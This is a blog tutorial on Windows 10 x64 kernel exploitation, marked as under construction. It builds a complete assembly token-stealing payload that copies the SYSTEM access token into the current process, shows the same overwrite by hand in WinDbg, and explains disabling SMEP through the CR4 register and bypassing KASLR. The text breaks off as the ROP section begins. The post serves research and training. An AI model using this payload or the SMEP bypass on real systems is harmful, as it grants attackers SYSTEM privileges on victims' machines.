---
title: "Exploit Development: Panic! At The Kernel - Token Stealing Payloads Revisited on Windows 10 x64 and Bypassing SMEP (UNDER CONSTRUCTION)"
date:  2020-02-01
tags: [posts]
excerpt: "Revisiting token stealing payloads on Windows 10 x64 and diving into bypassing SMEP"
---
Introduction
---
Same ol' story with this blog post- I am trying to continue and further my research/overall knowledge on Windows kernel exploitation in order to prepare for [AWE](https://www.blackhat.com/us-20/training/schedule/index.html#advanced-windows-exploitation-19158), and to garner more experience with exploit development. Previously I have talked about [a](https://connormcgarr.github.io/Part-2-Kernel-Exploitation/) [couple](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/) of vulnerability classes on Windows 7 x86, which is an OS with minimal protections. I wanted to do a deeper dive into token stealing payloads, which I have previously talked about on x86, and see what differences x64 will have and see what more clarity I can provide. I also wanted to dive into x64, which is a far more common architecture in 2020, and understand protections such as Supervisor Mode Execution Prevention (SMEP).

Gimme Dem Tokens!
---
As apart of Windows, there is something known as the SYSTEM process. The SYSTEM process, PID of 4, houses the majority of kernel mode system threads. The threads stored in the SYSTEM process, only run in context of kernel mode. Recall that a process is a "container" for threads. A thread is the actual item within a process that performs the execution of code. You may be asking "how does this help us?" Especially, if you did not see my last post. In Windows, each process object, known as `_EPROCESS`, has something known as an [access token](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens). This determines the security context of a process or a thread. Since the SYSTEM process houses execution of kernel mode code, it will need to run in a security context that allows it to access the kernel. This would require system or administrative privilege. This is why our goal will be to identify the access token value of the SYSTEM process and copy it to a process that we control, or the process we are using to exploit the system. From there, we can spawn `cmd.exe` from the now privileged process, which will grant us `NT AUTHORITY\SYSTEM` priviled code execution.

Identifying the SYSTEM Process Access Token
---
We will use Windows 10 x64 to outline this overall process. First, boot up WinDbg on your debugger machine and start kernel debugging you debuggee machine (see my [post](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/) on setting up a debugging enviornment. In addition, I noticed on Windows 10, I had to execute the following command on my debugger machine after completing the `bcdedit.exe` commands: `bcdedit.exe /dbgsettings serial debugport:1 baudrate:115200`)

Once that is setup, execute the following command, to dump the process list:

`!process 0 0`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_1.png" alt="">

This returns a few elements of each process. We are most interested in the "Process address", which has been outlined in the image above at address `0xffffe60284651040`. Since we have enumerated that address, we can enumerate much more detailed information about the `_EPROCESS` structure of the SYSTEM process.

`dt nt!_EPROCESS <Process address>`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_2.png" alt="">

`dt` will display information about various variables, data types, etc. As you can see from the image above, various information about the SYSTEM process has been displayed. If you continue down the kd windows in WinDbg, you will see the `Token` element, at an offset of 0x358.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_3.png" alt="">

What does this mean? That means for each process on Windows, the access token is located at an offset of 0x358. We will for sure be using this information later. Before moving on though, let's take a look at how the `Token` element is stored.

As you can see from the above image, there is something called `_EX_FAST_REF`, or an Executive Fast Reference union. The difference between a union and a structure, is that a union stores data types at the same memory location (notice there is no difference in offset of the elements of `_EX_FAST_REF` in the image below). This is what the access token of a process is stored in. Let's take a closer look at this structure.

`dt nt!_EX_FAST_REF`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_4.png" alt="">

Take a look at the `RefCnt` element. This is a value, appended to the access token, that keeps track of references of the access token. On x86, this is 3 bits. On x64 (which is our current architecture) this is 4 bits, as shown above. We want to clear these bits out, using logical AND. That way, we just extract the actual value of the `Token`, and not other unnecessary metadata.

To extract the value of the token, we simply need to view the `EX_FAST_REF` union of the SYSTEM process at an offset of 0x358 (which is where our token resides). From there, we can figure out how to go about clearing out `RefCnt`.

`dt nt!_EX_FAST_REF <Process address>+0x358`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_5.png" alt="">

As you can see, `RefCnt` is equal to 0y0111. 0y denotes a binary value. So this means `RefCnt` in this instance equals 7 in decimal.

So, let's use logical AND to try to clear out those last few bits.

`? TOKEN & 0xf`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_6.png" alt="">

As you can see, the result is 7. This is not the value we want- it is actually the inverse of it. Logic tells us, we should take the inverse of 0xf, -0xf.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_7.png" alt="">

So- we have finally extracted the value of the raw access token. At this point, let's see what happens when we copy this token to a normal `cmd.exe` session.

Openenig a new `cmd.exe` process on the debuggee machine:

<img src="{{ site.url }}{{ site.baseurl }}/images/64_7_a.png" alt="">

After spawning a `cmd.exe` process on the debuggee, let's identify the process address in the debugger.

`!process 0 0 cmd.exe`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_8.png" alt="">

Now that we have the process address located at `0xffffe6028694d580` for `cmd.exe`. We also know, based on our research earlier, that the `Token` of a process is located at an offset of 0x358 from the process. Let's Use WinDbg to overwrite the `cmd.exe` access token with the access token of the SYSTEM process.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_9.png" alt="">

Now, let's take a look back at our previous `cmd.exe` process.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_10.png" alt="">

As you can see, `cmd.exe` has become a privileged process! Now the only question remains- how do we do this dynamically with a piece of shellcode?

Assembly? Who Needs It. I Will Never Need To Know That- It's Irrelevant
---

<img src="{{ site.url }}{{ site.baseurl }}/images/64_MEME1.png" alt="">

Small rant here- isn't it so funny the same ones who say exploit development is a waste of time and irrelevant are the same ones who will use Eternal Blue. ;)

Assembly will always hold a dear place in my heart, and I think everyone should at least know the fundementals and understand how powerful it is.

Anyways, let's develop an assembly program that can dynamically perform the above tasks in x64.

So let's start with this logic- we want to enumerate the current process. The current process during exploitation will be the process that triggers the vulnerability (the process where the exploit code is ran from). We want to get this process, because eventually we want to copy the SYSTEM access token to it. Let's do that

`PsGetCurrentProcessId()` is a Windows API function that identifies current thread and the process the thread resides in. This is identical to `IoGetCurrentProcess()`, and Microsoft recommends users to invoke `PsGetCurrentProgress()` instead. This function returns a pointer to the current PID's thread. Let's unassemble that function in WinDbg.

`uf nt!PsGetCurrentProcess`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_11.png" alt="">

Let's take a look at the first instruction `mov rax, qword ptr gs:[188h]`. As you can see, the GS segment register is in use here. This segment is a data segment, used to access different types of data structures. If you take a closer look at this segment, at an offset of 0x188 bytes, you will see `KiInitialThread`. This is a pointer to the `_KTHREAD` in the current threads `_ETHREAD` structure. The `_ETHREAD` structure is the thread object for a thread. `nt!KiInitialThread` is the address of this structure. Let's take a closer look

`dqs gs:[188h]`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_12.png" alt="">

This shows the GS segment register, at an offset of 0x188, holds an address of `0xffffd500e0c0cc00` (different on your machine because of ASLR/KASLR). This should be the `nt!KiInitialThread`, or the `ETHREAD` structure for the current thread. Let's verify this with WinDbg.

`!thread -p`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_13_a.png" alt="">

As you can see, we have verified that `nt!KiInitialThread` represents the address of the current thread.

Recall what was mentioned about threads and processes earlier. Threads are the part of a process that actually perform execution of code (for our purposes, these are kernel threads). Now that we have identified the current thread, let's identify the process associated with that thread (which would be the current process). Let's go back to the image above where we unassembled the `PSGetCurrentProcess()` function.

`mov rax, qword ptr [rax,0B8h]`

RAX alread contains the value of the GS segment register at an offset of 0x188 (which contains the current thread). The above assembly instruction will move the value of `nt!KiInitialThread + 0xB8` into RAX. Logic tells us this has to be the location of our current process, as the only instruction left in the `PsGetCurrentProcess()` routine is a `ret`. Let's investigate this further.

Since we believe this is going to be our current process, let's view this data in an `_EPROCESS` structure.

`dt nt!_EPROCESS poi(nt!KiInitialThread+0xb8)`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_41_a.png" alt="">

First, a little WinDbg kung-fu. `poi` essentially dereferences a pointer, which means obtaining the value a pointer points to.

And as you can see, we have found where our current proccess is! The PID for the current process at this time is the SYSTEM process (PID = 4). This is subject to change dependent on what is executing, etc. But, it is very important we are able to identify the current process.

Let's start building out an assembly program that tracks what we are doing.

```nasm
; Windows 10 x64 Token Stealing Payload
; Author Connor McGarr

[BITS 64]

_start:
	mov rax, [gs:0x188]		    ; Current thread (_KTHREAD)
	mov rax, [rax + 0xb8]	   	    ; Current process (_EPROCESS)
  	mov rbx, rax			    ; Copy current process (_EPROCESS) to rbx
```

Notice that I copied the current process, stored in RAX, into RBX as well. You will see why this is needed here shortly.

Take Me For A Loop!
---

Let's take a loop at a few more elements of the `_EPROCESS` structure.

`dt nt!_EPROCESS`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_15.png" alt="">

Let's take a look at the data type of `ActivePorcessLinks`, `_LIST_ENTRY`

`dt nt!_LIST_ENTRY`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_16.png" alt="">

This data type is a doubly linked list. This means that each element in the linked list not only points to the next element, but it also points to the previous one. Essentially, the elements point in each direction. This linked list is responsible for keeping track of all active processes.

There are two elements of `_EPROCESS` we need to keep track of. On Windows 10 x64, located at an offset of 0x2e0, `UniqueProcessId`. `ActiveProcessLinks` also needs to be kept track of, which is located at an offset 0x2e8.

So essentially what we can do in x64 assembly, is locate the current process. From there, we can iterate and loop through the `_EPROCESS` structure's `ActiveLinkProcess` element. After reading in the current `ActiveProcessLinks` element, we can compare the current `UniqueProcessId` (PID) to the constant 4, which is the PID of the SYSTEM process. Let's continue our already started assembly program.

```nasm
; Windows 10 x64 Token Stealing Payload
; Author Connor McGarr

[BITS 64]

_start:
	mov rax, [gs:0x188]		; Current thread (_KTHREAD)
	mov rax, [rax + 0xb8]	   	; Current process (_EPROCESS)
  	mov rbx, rax			; Copy current process (_EPROCESS) to rbx
	
__loop:
	mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
	sub rbx, 0x2e8		   	; Go back to current process (_EPROCESS)
	mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
	cmp rcx, 4 			; Compare PID to SYSTEM PID 
	jnz __loop			; Loop until SYSTEM PID is found
```

Once that SYSTEM `_EPROCESS` structure has been found, we can now go ahead and retrieve the token and copy it to our current process. This will unleash God mode on our current process. God, please have mercy on the soul of our poor little process.

<img src="{{ site.url }}{{ site.baseurl }}/images/Picture1.png" alt="">

Once we have found the SYSTEM process, remember that the `Token` element is located at an offset of 0x358 to the `_EPROCESS` structure of the process.

Let's finish out the rest of our token stealing payload for Windows 10 x64.

```nasm
; Windows 10 x64 Token Stealing Payload
; Author Connor McGarr

[BITS 64]

_start:
	mov rax, [gs:0x188]		; Current thread (_KTHREAD)
	mov rax, [rax + 0xb8]		; Current process (_EPROCESS)
	mov rbx, rax			; Copy current process (_EPROCESS) to rbx
__loop:
	mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
	sub rbx, 0x2e8		   	; Go back to current process (_EPROCESS)
	mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
	cmp rcx, 4 			; Compare PID to SYSTEM PID 
	jnz __loop			; Loop until SYSTEM PID is found

	mov rcx, [rbx + 0x358]		; SYSTEM token is @ offset _EPROCESS + 0x358
	and cl, 0xf0			; Clear out _EX_FAST_REF RefCnt
	mov [rax + 0x358], rcx		; Copy SYSTEM token to current process

	xor rax, rax			; set NTSTATUS SUCCESS
	ret				; Done!
```

Notice our use of logical AND. We are clearing out the last 4 bits of the RCX register, via the CL register.. If you have read my [post](https://connormcgarr.github.io/WS32_recv()-Reuse/) about a socket reuse exploit, you will know I talk about using the lower byte registers of the x86 or x64 registers (RCX, ECX, CX, CH, CL, etc).

As you can see also, we ended our shellcode by using logical XOR to clear out RAX. NTSTATUS uses RAX as the regsiter for the error code. NTSTATUS, when a value of 0 is returned, means the operations successfully performed.

Before we go ahead and show off our payload, let's develop an exploit that outlines bypassing SMEP. We will use a stack overflow as an example, in the kernel, to outline using [ROP](https://connormcgarr.github.io/ROP/) to bypass SMEP.

SMEP Says Hello
---

<img src="{{ site.url }}{{ site.baseurl }}/images/64_SMEP.png" alt="">

Let's talk about SMEP. SMEP, or Supervisor Mode Execution Prevention, is a protection that was started as apart of Windows 8. When we talk about executing code for a kernel exploit, the most common technique is to allocate the shellcode is user mode and the call that user mode address in the kernel. This means the user mode code will be called in context of the kernel, giving us the applicable privilege to obtain SYSTEM privileges.

SMEP is a prevention that does not allow us execute code stored in a ring 3 page from ring 0 (executing code from a higher ring in general). This means we cannot execute user mode code from kernel mode. In order to bypass SMEP, let's understand how it is implemented- as well as two techniques to bypass it.

The SMEP policy is enforced via the CR4 register. The CR4 register is a control register. Each bit in this register is responsible for various protection features being enabled on the OS. The 20th bit of the CR4 register is responsible for SMEP being enabled. If the 20th bit of the CR4 register is set to 1, SMEP is enabled. When the bit is set to 0, SMEP is disabled. Let's take a look at the CR4 register on Windows with SMEP enabled in normal hexadecimal format, as well as binary (so we can really see where that 20th bit resides).

`r cr4`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_17.png" alt="">

The CR4 register has a value of 0x00000000001506f8 in hexadecimal. Let's view that in binary, so we can see where the 20th bit resides.

`.formats cr4`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_18.png" alt="">

As you can see, the 20th bit is outlined in the image above (counting from the right). Let's use the `.formats` command again to see what the value in the CR4 register needs to be, in order to bypass SMEP.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_19.png" alt="">

As you can see from the above image, when the 20th bit of the CR4 register is flipped, the hexadecimal value would be 0x00000000000506f8.

Let's start with the first way to disable SMEP, with ROP.

ROP 'N Roll!
---
Let's use the an overflow for this. ROP assumes we have control over the stack (as each ROP gadget returns back to the stack). Since SMEP is enabled, our ROP gagdets will need to come from the kernel. Since we are assuming [medium integrity](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)?redirectedfrom=MSDN) here, we can call `EnumDeviceDrivers()` to obtain the kernel base- which bypasses KASLR.

